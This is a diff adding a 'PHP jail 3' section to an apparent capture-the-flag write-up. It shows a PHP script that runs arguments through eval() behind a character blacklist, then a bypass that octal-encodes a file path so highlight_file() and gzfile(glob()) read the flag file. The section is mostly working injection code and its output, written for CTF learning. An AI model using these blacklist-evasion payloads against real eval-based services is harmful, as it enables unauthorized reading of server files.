@@ -778,6 +778,44 @@ FLAG-YlxV8cCg84zvUtt595dla5un9EW57BCL
 
 ![screenshot at 2018-08-09 17-10-16](https://user-images.githubusercontent.com/22657154/43908249-c7dec0fc-9bf7-11e8-8c29-49b73ca48061.png)
 
+# PHP jail 3 
+```php
+<?php
+array_shift($_SERVER['argv']);
+$var = implode(" ", $_SERVER['argv']);
+
+if($var == null) die("PHP Jail need an argument\n");
+
+function filter($var) {
+	if(preg_match('/(`|\.|\$|\/|a|c|s|require|include)/i', $var)) {
+		return false;
+	}
+	return true;
+}
+if(filter($var)) {
+	eval($var);
+	echo "Command executed";
+} else {
+	echo "Restricted characters has been used";
+}
+echo "\n";
+?>
+```
+```assembly
+┌─[root@parrot]─[~]
+└──╼ #phpjail /home/level3/flag.txt
+\\57\\150\\157\\155\\145\\57\\154\\145\\166\\145\\154\\63\\57\\146\\154\\141\\147\\56\\164\\170\\164
+```
+```assembly
+highlight_file("\\57\\150\\157\\155\\145\\57\\154\\145\\166\\145\\154\\63\\57\\146\\154\\141\\147\\56\\164\\170\\164");
+<code><span style="color: #000000">
+FLAG-D6jg9230H05II3ri5QB7L9166gG73l8H
+```
+```assembly
+print join(gzfile(glob("\\57\\150\\157\\155\\145\\57\\154\\145\\166\\145\\154\\63\\57\\146\\154\\141\\147\\56\\164\\170\\164")[0]));
+FLAG-D6jg9230H05II3ri5QB7L9166gG73l8H
+
+```
 
 
 # Forensics 
